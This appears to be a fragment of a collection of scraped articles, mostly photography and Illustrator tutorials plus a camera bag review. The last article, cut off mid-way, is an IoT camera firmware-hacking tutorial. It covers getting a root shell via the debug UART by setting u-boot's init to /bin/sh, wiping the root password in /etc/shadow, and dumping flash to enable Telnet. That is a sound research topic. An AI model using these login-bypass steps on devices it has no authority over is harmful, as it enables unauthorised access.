mind, if I needed access to any part of the bag, I had it without having to take the backpack off my roller. And it has a pouch in the front of the bag, including a zipped compartment, for storing things like your passport, boarding pass, etc. \nSomething else that will generally vary from flight to flight, and from seat to seat, is how much room you\u2019ll have underneath the seat in front of you in order to store your personal item. There isn\u2019t always room for personal items in the overhead bins. The flights to and from Amsterdam were fairly small planes, but I had no problem fitting the Hybrid underneath the seat in front of me either at the aisle seat going out or the window seat coming home. \nAll in all, it was probably the smoothest flight I\u2019ve ever had as far as dealing with my carry on bags goes. Both from a checking in and boarding standpoint as well as logistical. \nUsing it in other places \nAfter arriving in Amsterdam, this was where the Hybrid Backpack\u2019s versatility really started to make itself stand out. When I\u2019m heading away somewhere to work, especially if I need to use my laptop at the hotel, I often prefer to sit in the hotel bar or restaurant rather than in my room. It\u2019s a nicer atmosphere, they have bigger tables, and there\u2019s always somebody who can keep bringing me coffee. \nBut working in a hotel restaurant often means a laptop, charger, mouse, tablet (the Android kind, not the Wacom kind), SSD, headphones and various other bits. Trying to carry all that lot in your hands is a pain. Switching the Hybrid into backpack mode makes it a doddle to carry everything around while still keeping both of my hands free and without risking dropping everything on the floor. \nBecause the inside of the bag is compartmented, I can get easy access to everything I need quickly without having to unload the entire bag to find one small cable. The compartments inside the bag are housed in a pouch that\u2019s velcroed to the sides. This can be removed if you want to utilise the full space and don\u2019t need to store specific individual items in there. \nFor more general use, attaching the shoulder strap and just slinging it over your shoulder is the easiest way to have access to it regularly while carrying it around without it tying up your hands. \nThis is the form I like for when I\u2019m out shooting with it. Packing light for landscapes with just a camera, a few ND filters and a travel tripod it\u2019s a lightweight bag that I can just throw over my shoulder while walking, but it leaves everything in easy reach without having to set the bag down to open it. \nThe same thing goes for street photography. I can pop a couple of cameras in there with plenty of room to rummage around and have easy access to everything. If I\u2019m shooting film, the top pouch lets me store a few rolls and my Sekonic meter, too. \nI use it a lot for my location scouting trips, too. I tend not to take a lot of gear with me on those trips. Usually, it\u2019s just one body with a zoom lens, a travel tripod. In backpack mode, it lets me keep the bag out of the way and have both of my hands available to make sure I don\u2019t fall on my ass while clambering through the wilderness \u2013 it\u2019s been known to happen. Once I get to a spot where I want to shoot, I can put it over the shoulder and have easy access to take my camera out or put it away. \nThe size of this bag makes it ideal as a lightweight backpack, and when I need regular access to the inside, I just take it off my shoulder, lay it down on its side, unzip it and I\u2019ve got access to everything. And when in backpack mode, there are also a couple of side pouches for holding a couple of bottles of water or other drinks to keep you hydrated while exploring. \nOne of the other important factors for travel bags is the build quality. And when it comes to the Advanced2 Hybrid Backpack the build quality is as good as you\u2019d expect from a company like Manfrotto. The material feels good and the stitching looks good. I\u2019ve only been using the bag for a few weeks so far, but it\u2019s been thrown around like the other backpacks I\u2019ve used, and it looks like it should withstand the rigours of regular use pretty well. \nPros & Cons \nIt\u2019s difficult to really describe a bag like this in the concept of pros and cons. It\u2019s well built, it has various practical and useful cavities, pockets and slots that are valuable for travelling photographers, it\u2019s comfortable to wear and use in all three of its forms and it carries a nice amount of gear for a light shoot or casual day out. \nIt might be a little on the pricey side compared to some other backpacks, but I expect that it will be very worth it in the long term. As I said, it\u2019s well built, and I so far it\u2019s stood up to just about everything I\u2019ve thrown at it travelling to other countries and exploring around the Scottish wilderness. If this bag doesn\u2019t last a good few years, I would be very disappointed. \nThe only real negative I have for the Advanced2 Hybrid Backpack, as I mentioned in the video up top, is that I wish there was a short handle on the \u201ctop\u201d of the bag for when it\u2019s in backpack mode. If I have to take it off my shoulder to set it down and then pick it back up again fairly regularly, which can happen a lot when you\u2019re travelling, I don\u2019t have to bend down quite as far in order to do it. But, it\u2019s not a real breaker for me. \nFinal thoughts\u2026 \nThe Hybrid Backpack is primarily intended for travel photographers or lightweight day-tripping with basic gear. One camera, a lens or two, a small travel tripod, maybe a laptop, with space for your passport, travel tickets, and a few other bits. It\u2019s also handy for things like street photography, location scouting, or any other times where you only need a small bag of kit out with you. \nThe three different modes the bag offers make it a very versatile option over a regular backpack or messenger bag. The top handle mode with the slot in the back for a roller handle makes it ideal for travelling with, and it complies to the personal item limitations on many airlines (but do check with your airline first!). The backpack and shoulder bag modes are pretty self-explanatory and will be the ways you\u2019ll likely use it 99% of the time. \nThe big test for me of any camera bag is which one I instinctively go for when I need to head out the door? Over the past few weeks, for me, when I haven\u2019t needed to carry a whole ton of gear, that\u2019s been the Manfrotto Advanced2 Hybrid Backpack. I have several small backpacks and other bags here, but since I got the Hybrid Backpack, I\u2019ve not touched any of them. And when I fly or take a train with my roller case, the Hybrid Backpack is now pretty much a permanent partner for it. \nThe Manfrotto Advanced2 Hybrid Backpack is available to buy now for $169.99 in the USA or for \u00a3149.95 in the UK ( Amazon UK ).",

      "text": "In today\u2019s tutorial, we\u2019re going to take a close look behind the process of creating a file cabinet icon, and see how easy it is to create one from scratch using nothing more than a couple of basic shapes and tools. \nTutorial Details: File Cabinet Icon \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 25 Minutes \nFinal Image: File Cabinet Icon \nStep 1 \nAs always we\u2019re going to kick things off by setting up a New Document by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 128 px \nHeight: 128 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nOnce we\u2019ve set up our project file, we can start working on the actual icon and we will do so by creating the background using a 120 x 120 px circle which we will color using #808080 , and then position to the center of the underlying Artboard . \nStep 3 \nAdd the main shape for the file cabinet icon using a 60 x 36 px rectangle, which we will color using #EF855B and then center align to the larger circle, positioning it at a distance of 26 px from its bottom anchor point . \nStep 4 \nGive the shape an outline using the Stroke method, by creating a copy of itself ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to #4D4D4D . Then, flip its Fill with its Stroke using the Shift-X keyboard shortcut, setting its Weight to 4 px . \nStep 5 \nCreate the handle using a 32 px wide 4 px thick Stroke line ( #4D4D4D ), which we will center align to the cabinet\u2019s main body, making sure to select and group all three shapes together afterwards using the Control-G keyboard shortcut. \nStep 6 \nAdd the main shape for the document using a 40 x 24 px rectangle, which we will color using #E6E6E6 and then position onto of the cabinet\u2019s upper edge as seen in the reference image . \nStep 7 \nCreate the folded corner using a 12 x 12 px square ( #999999 ) with a 4 px thick outline ( #4D4D4D ), which we will group ( Control-G ) and then align to the document\u2019s top-right corner. \nStep 8 \nAdjust the document by adding a set of new anchor points to its top and right edges using the Add Anchor Point Tool (+) , by simply clicking on them where it meets the top-left and bottom-right anchors of the corner. \nStep 9 \nContinue adjusting the shape by removing its top-right anchor by simply clicking on it using the Delete Anchor Point Tool (-) . \nStep 10 \nSince we want the corner to remain confined to the surface of the larger document, we\u2019re going to mask it by creating a copy ( Control-C ) of the underlying shape, which we will then paste in front ( Control-F ) and with both of them selected simply right click > Make Clipping Mask . \nStep 11 \nGive the document a 4 px thick outline using the Stroke method, making sure to color it using #4D4D4D . \nStep 12 \nFinish off the document and with it the icon itself by adding the hard shadow using a 40 x 6 px rectangle ( #4D4D4D ), which we will center align to its bottom edge. Once you\u2019re done, select and group all of its composing shapes using the Control-G keyboard shortcut, doing the same for the entire icon afterwards. \nGreat Work! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful along the way. \nThat being said, if you have any questions, feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nJust another coffee addict/pixel grinder, creating colorful projects one pixel at a time. \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "title": "How To Create a Motion Blur Effect in Photoshop",
      "text": "How To Create a Motion Blur Effect in Photoshop \nIn this Photoshop tutorial, you will learn how to create a motion blur effect for your photograph. \nFinal Image \nAs always, this is the final image that we\u2019ll be creating: \nTutorial Details \nProgram : Adobe Photoshop CC2015 \nEstimated Completion Time: 30 minutes \nDifficulty: Beginner \u2013 Intermediate \nResources \nIntroduction \nMotion blur is the streaking effect that occurs when objects are photographed moving rapidly, or at a long shutter speed. \nOften, you\u2019ll want to capture something moving (like the child running in the example below) using a fast shutter speed, to guarantee you get your subject in focus. That can, unfortunately, take away the effect of the motion that blur helps convey. In some cases, it can be useful to add that blur back in, in post-production. \nHere, we\u2019ll show you a couple of methods of adding motion and interest using blur. \nStep 1 \nSelect the object you want to apply motion to use the Quick Selection, Lasso or Pen Tool. \nStep 2 \nCopy the selection to a new layer. \nStep 3 \nGo to Filter > Blur > Motion Blur . \nYou can use Angle to change the direction of the blur, so in our case we want it to move from right to left. \nAdjust the Distance slider until you have the desired length of blur lines. \nStep 4 \nYour photo should now look something like this. \nIf you want to increase in the intensity of the blur, you can duplicate the layer a few times. If you do this, merge the layers into one again afterward. \nStep 5 \nAdd a layer mask to your blur layer and either brush out the blur that isn\u2019t needed or, if you want to make sure it\u2019s more gradual, use a gradient. \nTidy up with a brush afterward for any obvious areas like the face. \nMore Controlled Blur \nIf you\u2019d like to have more control over how you use blur, you can try this method. \nStep 1 \nDuplicate your background and go to Filter > Blur Gallery > Path Blur . \nStep 2 \nClicking on the image will create a point. You can then drag a line out to the center of the image and click again to release it. The blur will then replicate the same path. Replicate this around the image, staying away from the very center. \nStep 3 \nWhen you\u2019re done, hit okay and add a mask to your blur layer. Using a soft brush, brush out the blur in the middle of your image. \nDrop the opacity on the whole layer to around 60%. \nAnd We\u2019re Done! \nThis technique is often called a zoom blur and can be a great effect for livening up photographs or for creating bespoke backgrounds to use with other images.",

      "title": "How to Shoot UV \u2018Liquid Flow\u2019 Photos",
      "text": "Dropping colored milk into water and photographing the effects is nothing new \u2013 these experiments have existed for decades and can yield some very interesting abstract images. The technique can be brought into the \u201cmad scientist\u201d realm by switching gears slightly \u2013 using UV flashlights and fluorescing ink, we can make it glow! \nThe ingredients here are simple: \nFish tank : Anything made of glass will work, so long as it has flat sides. \nUV flashlight . The Convoy S2+ or the Convoy C8 Fyrfly are great choices \nFlashlight supports . The Platypod Max and gooseneck arms, weighted down by the tank, provide a very flexible solution. \nFluorescing ink . Two of my favourites are Noodler\u2019s Blue Ghost and Dragon Catfish Orange . \nUV safety glasses . Protect your eyes! \nThere are a few challenges to consider \u2013 one of which is focus. The best solution is to pre-focus on something in the water (I use kebab skewers) and mark on the sides of the tank where this is. There will be some deviation from this point when you drop the ink into the water, but shooting with a wider field and F/11 should give you more than enough depth. The camera should also be angled slightly up, so that you can get a bit of the surface of the water in the frame which will offer up reflections, adding an extra bit of dimension to the images. I find that rotating the images 180 degrees offers up a fun twist on these fluidic sculptures. \nTurn off the room lights, turn on your UV flashlights, and begin experimenting! Your first tank of water will likely be used just to dial in your exposure. This will depend on how many UV lights you are using (two lights, one on each side, is a great place to start) and how fluorescent your liquids are. I found that with four lights, F/13, 1/200sec and ISO 1000 were working well, but these images survive noise reduction very well so don\u2019t be afraid to push further. \nThe shapes created when you drop the ink into the water are caused by the Rayleigh\u2013Taylor instability . The two fluids have different densities which cause beautiful interactions, and the same physics is responsible for the shape of mushroom clouds and supernovae. Thankfully, this experiment is far less destructive. \nThe artistry comes from how you make the shapes interact, how carefully you time the drops of ink, and even how you prepare the water \u2013 adding a current from heating part of the tank, for example, will affect the flow of the liquids. There is a strong element of randomness to this, and you\u2019ll never get the same results twice. \nSo, now you\u2019re set up for shooting UV fluorescence images! What else can you shoot? Minerals, flowers, and more!

      "title": "What I Learned from Capturing My First Total Solar Eclipse",
      "text": "Last week I made the long trip from the UK to Chile in the hopes of capturing my first total solar eclipse. I had experienced a cloudy total solar eclipse from the UK in 1999 but back then I was just 9 years old and certainly no photographer. Now that I\u2019m apparently a professional landscape astrophotographer, a total solar eclipse was a gaping hole in my portfolio. \nTotal solar eclipses are of course a rare event. They occur once every 18 months on average but totality can only be seen from a thin and short path each time. On top of that, there will inevitably be eclipses ruined by bad weather and eclipses that occur in locations difficult to reach, such as the 4 December 2021 eclipse that passes through Antarctica. As such, people who are experienced in photographing total solar eclipses are few and far between and although I have only now captured just one myself, I\u2019d still like to share what I learned from it. \nProper Planning Prevents Poor Performance \nTotality can last up to 7 mins 30 secs but is usually much shorter. In my case, it was just 2 mins and 37 secs. That\u2019s not a lot of time, so you need to make sure you\u2019re ready! Prior to the trip, I listed out what I wanted to achieve: \nTelephoto Sequence (Partial Eclipse, Diamond Ring, Bailey\u2019s Beads, Totality) \nWide Angle Sequence (Image taken during totality with partial eclipse phases blended on top) \nLong distance alignment of person in foreground with total eclipse ~800mm focal length \nVlog footage of myself doing the above and of course my reaction to the event \nThen it was a matter of working out which gear I would use for each and then, of course, the settings required. Now, I mentioned that there aren\u2019t many people out there with experience in photographing solar eclipses but one of those people is certainly Fred Espenak, the retired NASA Astrophysicist behind mreclipse.com . I used his tables to work out the settings I would need for my telephoto sequence shots and the numerous examples of wide angle shots also guided me for my own. \nI wasn\u2019t able to decide the focal length for my wide angle shot until I was in the field and had found a composition I was happy with though. To assist with this I jotted down some notes and diagrams that would help me choose. I drew out a diagram of where the Sun would be positioned during the main moments of the eclipse and also the angular size of various focal lengths. I also noted the settings for my telephoto sequence. Notebooks don\u2019t require batteries or internet signal, so they\u2019re always a safe bet. \nBracket, Bracket, Bracket! \nEven though I had worked out my settings based on the past experience of others, it is, of course, important to bracket your shots. Atmospheric conditions such as thin clouds could potentially alter the exposure of a total solar eclipse. It\u2019s also worth noting that the eclipse I would be capturing was to occur only 13\u00b0 above the horizon and so I would be viewing it through a thicker layer of Earth\u2019s atmosphere than if it was directly overhead. This can also reduce the exposure value. Ultimately, bracket and be safe, or be sorry! \nUse the Memory Recall Modes on Your Camera \nThere is a huge difference in exposure of the partial eclipse compared to the other telephoto possibilities (Diamond Ring, Bailey\u2019s Beads, chromosphere, corona). The partial eclipse would also require a solar filter which would need to be removed about 1 minute before totality. Not only that but the settings required for the various stages prior to totality also varied massively and in such a short space of time. \nRather than trying to adjust the settings manually, it was best to have a bracketed exposure that covered all of those settings and then I would continuously fire from 30 seconds before totality. Once I had worked out the sort of bracketing that I needed to cover everything, I saved the settings into Memory Recall 1 on my Sony camera. That way, 1-minute before totality, I could remove the solar filter and switch to Memory Recall 1 and fire away without wasting any time adjusting settings frantically. \nRehearse and Practice \nTotality is a frantic mix of emotional overload and panic. It\u2019s essential to rehearse and practice the short window of totality before the actual event and make sure all your settings are solid and your gear is up to the task. One issue I was having was composing at 800mm using a ball head. It was rather difficult to keep the Sun in the center of the frame as there was always a bit of sag after tightening the ball head and then releasing my grip on the camera and lens. As much as I would have loved to use an equatorial tracking mount, I didn\u2019t want to carry one half-way around the world with me and then for another 3 weeks around Chile all for one shot. \nIn the end, I opted for the Benro 3-Way Geared Head. Keeping the Sun in the center of the frame was as simple as making minute adjustments in two axes and there was no dreaded sag to worry about. Problem solved. \nAvoid Traffic and Camp Out \nThe only main city close to the path of totality in Chile was La Serena. With just a population of 200,000, they welcomed 300,000 visitors. Credit must be given and the public services were all handled impressively, but there\u2019s not much you can do to dodge that kind of traffic. To be safe, we headed to our location the day before and camped out. \nSolar Filters Are Essential But Don\u2019t Have to Be Expensive \nI remember seeing an article after the 2017 total eclipse in the USA showing all the rented gear that had been returned damaged by the Sun. I wasn\u2019t going to risk any of my gear in that way so I started looking into solar filters. At first I found some expensive variants for 100x100m and 150x150mm systems but then was recommended Baader Solar Film by a fellow astrophotographer and friend. The film is quite cheap and you can DIY your own holder. I opted for a Gosky aluminum mount, but my friend resorted to simple tape. \nRefocus After Removing the Solar Filter \nAlthough technically there is no need to refocus after removing the solar filter, there is a chance you may knock the focus ring during the removal of it. I think this may have happened to me as my telephoto shots are slightly out of focus. Next time, I would remove the solar filter slightly earlier to give myself a chance to refocus, just to be safe. \nHave a Backup Plan \nAbout an hour before the partial eclipse was to begin, my friend Adrien dropped his super telephoto lens! Fortunately, he had a backup lens with him, albeit not as long in reach than he originally had planned, but better than nothing. \nIt\u2019s also worth having a backup location just in case the weather forecast isn\u2019t great. But do bear in mind that if you need to change location last minute, traffic may be crazy. \nStay Calm \nThe experience of totality is far too great for words but perhaps watching me curse my way through the entire 2 mins and 38 secs in my recent vlog (embedded above), you can get some idea of what it can do to a person. It\u2019s such a moving experience, I\u2019m convinced that if I wasn\u2019t so focused on getting my shots I most certainly would have cried. If it\u2019s your first time, no matter how you imagine it will be, you can\u2019t prepare yourself for the real thing. Just stay calm and get the shots. \nEnjoy the Experience \nGiven the rarity of the event and just how moving it can be don\u2019t forget to enjoy it. In the end, I had to sacrifice some of the shots on my list as I didn\u2019t want to encroach on the experience too much. At least by keeping it simple, I had time to take it all and enjoy the precious moment and I\u2019m glad I did. \nMake it More Than Just the Eclipse \nIf like me you plan to travel for an eclipse then it\u2019s best to make it more than just the eclipse. The fear of bad weather ruining the even was unavoidable, but being encouraged to visit Chile gave me a good excuse to tick two locations off my bucket list; Easter Island and the Atacama Desert. Even if the eclipse had been cloudy, I\u2019m sure it wouldn\u2019t have ruined the trip altogether. \nAbout the author : Alyn Wallace is a landscape astrophotographer based in South Wales, UK.

      "text": "Welcome back to another icon tutorial in which we\u2019re going to learn how to create a skeleton key using nothing more than some simple geometric shapes and strokes. \nSo, assuming you already have Illustrator up and running let\u2019s jump straight into it! \nTutorial Details: Skeleton Key Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 20 Minutes \nFinal Image: Skeleton Key Icon \nStep 1 \nKick off the project by setting up a New Document ( File > New or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 96 px \nHeight: 96 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nStart working on the actual key, by creating a 12 x 12 px circle with a 4 px thick Stroke , which we will color using #383C44 , and then center align to the underlying Artboard , positioning it at a distance of 4 px from its bottom edge. \nStep 3 \nAdd the larger side sections using two 16 x 16 px circles with a 4 px thick Stroke ( #383C44 ), which we will position as seen in the reference image. \nStep 4 \nCreate a 4 px tall 4 px thick Stroke line ( #383C44 ) with a Round Cap , which we will center align to the bottom circle\u2019s top edge, making sure to select and group the two together using the Control-G keyboard shortcut. \nStep 5 \nAdd some details to the larger sections of the head using two 4 x 4 px circles ( #383C44 ), which we will position onto their outer edges as seen in the reference image. Once you have the shapes in place, select and individually group ( Control-G ) each of the two sections, doing the same for the entire head afterwards. \nStep 6 \nCreate the key\u2019s shaft, using a 68 px tall 4 px thick Stroke line ( #383C44 ), which we will center align to the Artboard , positioning it at a distance of 4 px from its top edge. \nStep 7 \nAdd the little ring segments using two 8 x 4 px rectangles, which we will color using #383C44 and then position as seen in the reference image. \nStep 8 \nStart working on the teeth by creating eight 10 x 4 px rectangles ( #383C44 ), which we will vertically stack and then position at a distance of 4 px from the top ring segment from the previous step. \nStep 9 \nFinish off the key and with it the project itself by adjusting the width of the rectangle segments that we\u2019ve just created as indicated below: \nsecond rectangle > 4 px \nthird rectangle > 8 px \nfourth rectangle > 6 px \nTake your time, and once you\u2019re done select and group ( Control-G ) all of them together doing the same for the entire icon afterwards. \nGreat Work! \nAs always, I hope you\u2019ve managed to follow each and every step and most importantly learned something new and useful along the way. \nThat being said, if you have any questions feel free to post them within the comments area and I\u2019ll get back to you as soon as I can! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Skeleton Key Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "How to Force iPhone to Capture JPEG Images",
      "text": "If you are one who is tired of HEIC picture format on your iPhone then you are at the right place where I am going to show you how you can force iPhone to capture JPEG images instead HEIC. \nAnother day, another amazing tutorial for those who are using iPhone running on iOS 13 or iOS 12 , for photography purposes or any other reason. We do not care about the reason but we know you are one who is looking for HEIC to JPEG conversion. Apple introduced High-Efficiency Image Format in iOS 12 for saving space on your device. Now it is a headache when you are copying images on your PC. You can\u2019t upload this format anywhere and now you have to convert them using any other tool. \nDo not worry, your iPhone can still capture images in JPEG format and you can still save your time. I want to quote an example here in my daily life. I am running an online store and I capture product images using my iPhone. Whenever I need the images on my MacBook, the images are available in HEIF format which is not possible to upload them on any social media like Instagram. Also, whenever you try to share them with any Android phone using Anywhere, Shareit or any other app they will remain in HEIC format. So that\u2019s why we need to change the format. \nAdvertisement \nIn this article, I have covered two different tips for you. Do not ignore them if you are serious and interested in iPhone Photography . \nAt first, I would like to share how you can force your iPhone to capture images in JPEG format without downloading any third-party application. Follow the all given below steps because this is a quick method. \nHow to Force iPhone to Capture Images in JPEG Format \nAt first, on your iPhone go to Settings. \nNow go to the Camera. \nTap Format. \nSet it to Most Compatible. \nRestart your iPhone. \nWhen the Most Compatible option is selected your iPhone will capture images in JPEG format. But keep in mind your device will stop saving space. \nThat\u2019s how you can do this without using any third-party tool. Also, if you still do not want to save space on your iPhone you can change the transfer format for other devices. Using that method your iPhone automatically selects the most compatible (JPEG, JPG, PNG) or any other formats. \nHow to Transfer iPhone Images as JPEG Format to a computer \nThis is also possible to force iPhone to convert images to JPEG format while transferring images to a PC or a MAC. It\u2019s the second tip for you which I was talking about. So follow the steps below and you are done with this. \nAt first, Open your iPhone Settings. \nNow this time, go to Photos. \nAt the bottom, go to Transfer to Mac or PC. \nChoose, Automatic option. \nRestart your device. \nNow while transferring images and videos the iPhone will allow the auto-format option for the devices on which you are sharing the captured photos. It\u2019s so much easy just give it a try. \nKeep in mind, if you are changing both settings then definitely you will find JPEG format at the end but there is no space optimization with photos on your iPhone. So, I recommend changing the transfer to automatic only. Do not change the settings for camera. \nOne more important thing is that only the latest phones have this option available. If you are using an older iPhone like iPhone SE or iPhone 6s with iOS 13 then you may not be able to find these settings. But do not worry, we have also covered this area for you. \nConvert HEIC to JPEG on iPhone \nThere are different ways to convert your existing HEIC format picture to JPEG on your iPhone. \nImage editing apps \nThere are a number of apps available in the Appstore that you can use to convert HEIC to JPEG format easily. Adobe Lightroom Photo Editor is a powerful photo editor app. Go ahead and find a well-rated app in the Appstore. \nCloud storage apps \nIf you are a user of Dropbox or OneDrive, both cloud storage services give the option to convert your HEIC format to JPEG before uploading. OneDrive app automatically does that for you but on the Dropbox app, in the Camera Uploads settings choose to save HEIC Photos As JPEG. \nThat\u2019s all for today. If you still have issues in converting HEIC photos to JPEG then comment below. We will help you with it. ",

      "title": "Getting Started Tutorial--How to Explore the Camera Vulnerability (Firmware)",
      "text": "Author: fenix@Knownsec 404 Team \nDate: November 27, 2017 \nChinese Version: https://paper.seebug.org/649/ \n0x00 Introduction \nAccording to Gartner , an IT research and consulting firm, the number of IoT devices worldwide will reach 8.4 billion in 2017, up 31% from 6.4 billion in 2016, while the global population is 7.5 billion. The number of IoT devices will reach 20.4 billion in 2020. \nIn response, the security issues of IoT are also increasingly prominent, especially for common devices such as webcams and routers. The rapid growth in the number of IoT devices is in sharp contrast to the serious lag in their security. At the same time, it also provides new opportunity for malicious attackers and security researchers to play the game of good versus evil on a new battlefield. \nThis is a detailed introductory level tutorial for many enthusiasts who want to get started with smart device security. \n0x01 Overview \n1.0 Firmware and Its Common Access Methods \nFirmware is a program written in EROM (Erasable Read Only Memory) or EEPROM (Electrically Erasable Programmable Read Only Memory). In particular, for most routers and cameras on the market, the firmware is the program in the 25 series Flash chip on the board, which houses the embedded operating system, usually a Linux system. \nObtaining the firmware is the premise of analyzing and mining firmware vulnerabilities. This paper will take the camera as an example to show how to dump firmware in Flash chips and some bright ideas after obtaining the firmware. \nIn general, there are several ways to obtain firmware. \nFrom the official: The firmware of devices such as routers and cameras can usually be downloaded directly from the official, while it doesn\u2019t support firmware download for most other IoT devices. The official generally only provide the latest firmware, not conducive to the study of historical firmware vulnerabilities. \nGrab packet to analyze the download address of firmware: When the phone controller (APP) can upgrade the firmware, you can try this method to obtain the firmware. If the firmware is upgraded in the form of patches, the complete firmware cannot be obtained, and data encryption may be difficult to crack. \nObtain via the serial port: Get shell from the debug serial port, then package and upload system files. \nRead the firmware memory chip directly: It is the simplest and most direct way to read the firmware memory chip directly through the programmer. If there is line interference, which can only be read offline, the equipment may be damaged during welding. \nThis paper deals with the latter two ways to extract firmware. \n0x02 About the Concepts \nBefore starting the formal firmware extraction, we need to grasp several basic concepts. \nThe Serial Port and UART \nThe serial port is mainly used for serial bit-by-bit data transmission. \nThe serial port asynchronously transmits and receives bytes in bits following the UART protocol. Normally, three pairs of pins need to be connected, and the connection mode is as follows: \n(Image via Internet) \nIn the figure above, TX is the receiving end, RX is the transmission end, and GND is the ground end. Connect the debug serial port of the board and the USB to TTL serial cable as shown. After setting important parameters such as baud rate, data bit, stop bit and parity check, the two sides can send ASCII characters normally, so as to carry out asynchronous serial communication. \n2.1 u-boot \nU-boot is a kind of boot program commonly used in embedded system. It is executed before the operating system runs, to initialize the hardware and software environment, and finally to boot the system kernel. \n0x03 Enter the System through the Debug Serial Port \n3.0 Research Objects \nIn this section, we will start with a wireless surveillance camera and explain how to get the Shell of the system through the debug serial port. \nDetect the open port and service of the camera by using nmap , and the result is as follows: \nHost is up (0.0031s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 100/tcp open http Mongoose httpd 554/tcp open rtsp 1935/tcp open tcpwrapped 100100/tcp open soap gSOAP 2.8 \nMongoose monitoring on port 100 is an embedded Web server, and gSOAP is a cross-platform tool for developing Web Service servers and clients. RTSP (Real Time Streaming Protocol) is an application-layer protocol in TCP/IP protocol system, which defines how one-to-many applications can effectively transmit multimedia data over IP networks. \nThe packet analysis of services can then be done by using tools like Fidder , wireshark , and others, but that's not the focus of this paper. Next we will analyze from the perspective of hardware. \nUSB to TTL serial cable \nsoldering iron \nscrewdrivers \n\u2026 \n3.2 Where is UART \nManufacturers of routers, cameras and other equipment usually leave debug serial ports on the devices to facilitate development or after-sales debugging. In order to communicate with the equipment, we first need to find these \"backdoors\". Disassemble camera apart with tools, and identify the purpose of the chip according to the model on the motherboard. As shown in the figure, we found the location of the processor and memory chip. The processor is GK7102 , and the memory chip is IC25LP128. There are three free interfaces on the motherboard in the right picture. After testing, the lower left one is the 4-pin debug serial port (baud rate 115200), the first pin of the serial port is Tx , the third pin is Rx , respectively connected with the Rx and Tx of USB-to-TTL . The line and the motherboard are powered by the same Hub, and the VCC is not much different, and no GND is connected. \nAs for how to find the debug serial port on the device, you can refer to reverse-engineer-serial ports , no more details here. \nminicom is a serial port tool on the Linux platform. Type the following command at the console to communicate with the serial port. \n# Use the following Bash code: minicom -D /dev/ttyUSB0 \nYou can use the following way in case of the permissions issues in this step. \nsudo chmod 777 /dev/ttyUSB0 \n3.3 Startup Process of Embedded System \nThe laptop is properly connected to the motherboard serial port. After power supply, the following debugging information during system startup can be seen in the terminal. \nThe partition information of Flash chip is as follows: \nAfter booting up, the system starts the following services, which may be the main process of the camera service. \nAfter the system is started, the Shell login interface is provided. \nBy observing the startup process, we have gained a lot of useful information and have a general understanding of how u-boot boots the system. \nFinally, we tried to use weak passwords to get the Shell of the system. Unfortunately, after many attempts, we failed. \n3.4 Login Bypass \nIf you've ever used Linux, maybe you've experienced the awkwardness of forgetting your system password and not being able to access it. Our solution is very simple and direct: go directly to the grub boot to change the password. Therefore, if the device is within reach, there is almost no problem of access to the system. \nOn a camera running an embedded Linux operating system, there exists u-boot as well, similar to grub . \nRestart the device and enter the u-boot command line by typing the combination keys. \nThere are many built-in commands for us to use in the u-boot command line. Type \u201ch\u201d to view the help. \nPrint the parameter information passed to the kernel by u-boot via printenv . \nThe contents of some of the parameters show how u-boot transfers control to the kernel. \nFirstly, set the startup parameters for the kernel. \nconsole=${consoledev},${baudrate} noinitrd mem=${mem} rw ${rootfstype} init=linuxrc \nLet's focus on the init field of the startup parameter. \nThe init field sets the name of the initialization process executed by the kernel, such as linuxrc above, which is a piece of program code located in the root directory of the file system, responsible for subsequent system initialization. \nIs it possible to directly modify init=/bin/sh to access the root file system when the system is not initialized? Modify the init field in sfboot as /bin/sh in the u-boot command line and save as follows (make a backup of parameters before modification): \nconsole=${consoledev},${baudrate} noinitrd mem=${mem} rw ${rootfstype} init=/bin/sh \nRestarting the device, as we suspected, modifying the initial process of kernel execution, we successfully obtained a shell . \nSince there is no linuxrc initialization process, the Shell functionality is greatly limited. Edit the /etc/shadow file under the shell, erase or crack the root user's password, restart to the u-boot command line interface, modify the original boot parameters and save, restart to the shell login interface again, and you can get a shell with complete functions. \n3.5 Package and Upload Firmware \nBased on the previous steps, We can now log into a fully functional Shell and use tar and tftp commands to pack and upload the root file system to the tftp server. \n3.6 Other Tricks \nThe relevant commands are provided in u-boot to operate the Flash chip, so the firmware can also be extracted as follows (the way of cat memory is just an idea, speed is a great limitation). \n0x04 Simply Reading and Writing Firmware Storage Chip Unlock New Features \nIn this section, we take another camera based on gSOAP protocol as an example (firmware memory chip MX25LP128) to show how to use a programmer to read and write Flash chips to open the Telnet service of the camera. \n25 Series Chip Programmer \nsoldering iron \n\u2026 \n4.1 Reading Firmware \nMX25L128 is a 25 series Flash chip that can read directly online. Clamp the Flash chip and connect the programmer to read the firmware inside. \nClick SmartID , and then click on Read after the chip model is successfully identified, and save it as a file. As shown below, the reading process is very smooth. \n4.2 Firmware Decompression \nBinwalk is a firmware analysis tool developed by @devttys0. It is highly recommended to use the tutorial installation on Github. Installing apt-get directly will lack many dependencies. \nView the firmware structure using binwalk . \nAfter compiling (make), the kernel generates two files, one is Image and the other one is zImage. Image is 